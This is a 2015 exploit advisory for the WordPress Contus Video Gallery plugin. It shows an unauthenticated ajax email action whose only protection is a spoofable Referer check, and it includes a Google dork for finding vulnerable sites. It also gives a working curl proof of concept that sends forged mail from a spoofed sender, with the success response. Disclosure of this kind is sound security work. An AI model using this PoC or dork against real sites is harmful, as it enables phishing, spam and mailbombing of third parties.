 
 
# Exploit Author : Claudio Viviani
 
# Website Author: http://www.homelab.it
                  http://archive-exploit.homelab.it/1 (Full HomelabIT Vulns Archive)
 
 
 
# Dork Google: index of "contus-video-gallery"
             
 
# Date : 2015-04-05
 
# Tested on : Windows 7 / Mozilla Firefox
              Linux / Mozilla Firefox         
 
######################
 
# Description
 
  
 This vulnerability is exploitable to dos, phishing, mailbombing, spam...
  
 The "email" ajax action is callable from any guest visitor (/contus-video-gallery/hdflvvideoshare.php)
  
  /**
  * Email function
  */
 add_action( &#039;wp_ajax_email&#039;, &#039;email_function&#039; );
 add_action( &#039;wp_ajax_nopriv_email&#039;, &#039;email_function&#039; );
  
 function email_function() {
     require_once( dirname( __FILE__ ) . &#039;/email.php&#039; );
     die();
 }
 
 Any user can send email from /contus-video-gallery/email.php to any recipients.
  
 The variables used to send emails are:
  
 $to   = filter_input( INPUT_POST, &#039;to&#039;, FILTER_VALIDATE_EMAIL );
 $from = filter_input( INPUT_POST, &#039;from&#039;, FILTER_VALIDATE_EMAIL );
 $url  = filter_input( INPUT_POST, &#039;url&#039;, FILTER_VALIDATE_URL );
 $subject  = filter_input( INPUT_POST, &#039;Note&#039;, FILTER_SANITIZE_STRING );
 $message_content =  filter_input( INPUT_POST, &#039;Note&#039;, FILTER_SANITIZE_STRING );
 $title    = filter_input( INPUT_POST, &#039;title&#039;, FILTER_SANITIZE_STRING );
 $referrer = parse_url( $_SERVER[&#039;HTTP_REFERER&#039;] );
 $referrer_host = $referrer[&#039;scheme&#039;] . &#039;://&#039; . $referrer[&#039;host&#039;];
 $pageURL  = &#039;http&#039;;
  
 It assumes that if the provided “Referrer” field fits the website’s URL, then it’s okay to send this email:
  
 if ( $referrer_host === $pageURL ) {
     $headers = "MIME-Version: 1.0" . "\r\n";
     $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";   
     $headers .= "From: " . "<" . $from . ">\r\n";
     $headers .= "Reply-To: " . $from . "\r\n";
     $headers .= "Return-path: " . $from;
     $username = explode(&#039;@&#039; , $from );   
     $username = ucfirst($username[&#039;0&#039;]);
     $subject  =  $username . &#039; has shared a video with you.&#039;;
     $emailtemplate_path  = plugin_dir_url( __FILE__ ).&#039;front/emailtemplate/Emailtemplate.html&#039;;    
     $message =  file_get_contents( $emailtemplate_path);
     $message = str_replace( &#039;{subject}&#039;, $subject, $message );
     $message = str_replace( &#039;{message}&#039;, $message_content, $message);
     $message = str_replace( &#039;{videourl}&#039;,$url,$message );
     $message = str_replace(&#039;{username}&#039;,$username ,$message );
     if ( @mail( $to, $title, $message, $headers ) ) {
         echo &#039;success=sent&#039;;
     } else {
         echo &#039;success=error&#039;;
     }
 } else {
     echo &#039;success=error&#039;;
 }
  
 The “Referer” field can easily be modified by the attacker!
 
######################
 
# PoC
 
 curl -X POST -d "from=attacker@attacker.com&to=victim@victim.com&Note=BodyMessage&title=Subject&url=http://www.homelab.it" \
 -e http://127.0.0.1 http://127.0.0.1/wp-admin/admin-ajax.php?action=email
 
 cUrl switch "-e" spoof referer address
 
# Http Response
 
  success=sent 
   
# Poc Video
 
http://youtu.be/qgOGPm1-tNc

